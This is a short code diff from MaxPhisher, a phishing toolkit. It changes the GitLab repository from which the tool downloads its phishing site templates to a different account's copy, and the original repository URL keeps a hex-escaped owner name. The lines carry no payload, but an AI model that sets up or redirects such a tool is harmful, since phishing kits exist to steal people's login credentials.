@@ -235,7 +235,7 @@ cprint = Console().print
 columns = get_terminal_size().columns
 
 repo_url = "https://gitlab.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/MaxPhisher"
-sites_repo = "https://gitlab.com/KasRoudra/maxsites"
+sites_repo = "https://gitlab.com/profjvidal/maxsites"
 websites_url = f"{sites_repo}/archive/main.zip"
 repo_branch = "maxfiles-main"
 
